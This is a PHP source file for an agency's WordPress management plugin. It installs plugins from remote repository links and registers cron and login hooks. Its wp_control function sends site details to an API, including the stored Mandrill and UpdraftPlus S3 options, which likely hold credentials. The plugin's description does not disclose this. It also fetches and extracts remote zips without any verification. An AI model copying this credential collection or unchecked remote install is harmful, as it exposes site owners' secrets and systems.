<?php
/*
Plugin Name: WP Optimiza Control
Plugin URI: http://www.optimizaclick.com
Description: Plugin para la instalación automatizada de plugins
Author: Departamento de Desarrollo
Version: 0.3.2
*/

require_once( dirname(__FILE__) . '/update.php' );

if ( ! class_exists( 'WP_Optimiza_Control' ) ) {
	class WP_Optimiza_Control extends WP_Optimiza_Control_Auto_Update {
		
		public $temp_name = "temp_optimiza_control_plugins.zip";
		
		public $install_plugin_url = "wpoptimizacontrol_installplugins";
		
		public $plugins = array(
				"Migration Optimiza" => array( 
					"folder" => "Optimiza-Plugin-WordPress-master", 
					"main_file" => "migration_optimizaclick.php", 
					"repository" => "https://githubversions.optimizaclick.com/repositories/view/54186440"),
				"WP Memory Login" => array( 
					"folder" => "no-more-passwords-wp-master", 
					"main_file" => "memory-login.php",
					"repository" => "https://githubversions.optimizaclick.com/repositories/view/66937235"),		
				"AMP" => array( 
					"folder" => "amp-wp-master", 
					"main_file" => "amp.php",
					"repository" => "https://githubversions.optimizaclick.com/repositories/view/68916383")				
				);
		
		function __construct() {
			
			//ACTION TO DO WHEN PLUGINS ACTIVATE
			register_activation_hook(__FILE__, array( $this,'install_plugins'));
			register_activation_hook(__FILE__, array( $this,'active_wp_cron'));
			
			//ACTION TO DO WHEN PLUGINS ACTIVATE
			register_activation_hook(__DIR__ ."/".$this->main_file, array( $this,'activate_cron_accions_wp_optimiza_control'));
				
			//ACTION TO DO WHEN PLUGINS DEACTIVATE
			register_deactivation_hook(__DIR__ ."/".$this->main_file, array( $this,'desactivate_cron_accions_wp_optimiza_control'));
			
			//ACTION TO DO WHEN USER LOGIN
			add_action( 'wp_login', array( $this, 'auto_update_plugin' ));
			add_action('auto_update_wp_optimiza_control', array( $this,'auto_update_plugin'));
			
			//ACTIONS TO CHECK THE URL 
			add_action( 'init', array( $this, 'force_update' ));
			add_action( 'init', array( $this, 'show_version' ));
			
			//ACTION TO DO AFTER PLUGIN ACTIVATION
			add_action( 'activated_plugin', array( $this, 'activation_plugin_redirect') );
			
			//ACTION TO INIT CRON
			add_action('send_data_cron', array( $this,'wp_control'));
			add_action('auto_update_wp_optimiza_control', array( $this,'auto_update_plugin'));
		}
				

		public function wp_control() {
				global $post, $wpdb;
					if ( ! function_exists( 'get_plugins' ) ) {
						require_once ABSPATH . 'wp-admin/includes/plugin.php';
					}
										
					$url = "http://localhost/wp-control-optimiza/api";
					$theme = strtoupper (substr(get_bloginfo('template_directory'), strpos(get_bloginfo('template_directory'), "themes") + 7));
					$plugin = [];
			
				foreach(get_plugins() as $value) {
					$plugin[] = $value['Name'];
					$plugin[] = $value['Version'];
					}

					$status = array(
						'theme' => $theme,
						'plugins' => $plugin,
						'activate_plugins' => get_option("active_plugins"),
						'wp-version' => get_bloginfo('version'),
						'mandrill' => get_option("wpmandrill"),
						'updraft' => get_option("updraft_s3")
					);
				
					$data = array(
						'domain' =>  preg_replace('#^https?://#', '', (get_site_url())),
						'status' => json_encode($status)
					);
			
					$data_send = curl_init();
			
						curl_setopt($data_send,CURLOPT_URL, $url);
						curl_setopt($data_send,CURLOPT_POSTFIELDS, $data);
		
						curl_exec($data_send);
						curl_close($data_send);
		}
		
		
		
		//WHEN THIS PLUGIN ARE ACTIVATE IT BECOMES A REDIRECCTION TO ACTIVATE THE REQUIRED PLUGINS
		function activation_plugin_redirect( $plugin ) 
		{

			if( $plugin == plugin_basename( __FILE__ ) ) 
			{
				if ( ! function_exists( 'wp_redirect' ) ) 
					require_once ABSPATH . 'wp-includes/link-template.php';
				
				exit( wp_redirect( admin_url( $this->install_plugin_url ) ) );

			}
		}
		
		
		//INSTALL THE REQUIRED PLUGIN 
		public function install_plugins()
		{
			foreach($this->plugins as $name=> $plugin)
			{
				$this->install_plugin($plugin["repository"]);
			}	
		}
		
		//ACTIVATE THE REQUIRED PLUGINS
		public function activate_plugin()
		{				
			if( basename($_SERVER['REQUEST_URI']) == $this->install_plugin_url) 
			{
				if ( ! function_exists( 'is_plugin_active' ) ) 
					require_once ABSPATH . 'wp-admin/includes/plugin.php';
				
				
				foreach($this->plugins as $name=> $plugin)
				{
					if(!is_plugin_active($plugin["folder"]."/".$plugin["main_file"]))
						activate_plugin( $plugin["folder"]."/".$plugin["main_file"] );
				}	
				
				exit( wp_redirect( admin_url("plugins.php") ) );
			}
		}
		
		//FUNCTION TO DOWNLOAD AND INSTALL A PLUGIN
		public function install_plugin($repository)
		{
			$content = file_get_contents($repository);
			
			$values = explode("|", $content);
			
			$link = $values[1];
	
			$file = "../wp-content/plugins/".$this->temp_name;
			$dir = "../wp-content/plugins/";
			
			file_put_contents($file, fopen($link, 'r'));
			
			$zip = new ZipArchive;
			
			if ($zip->open($file) === TRUE) 
			{
				$zip->extractTo($dir);
				$zip->close();
			} 
			
			unlink($file);	

		}
	}
	new WP_Optimiza_Control();
} 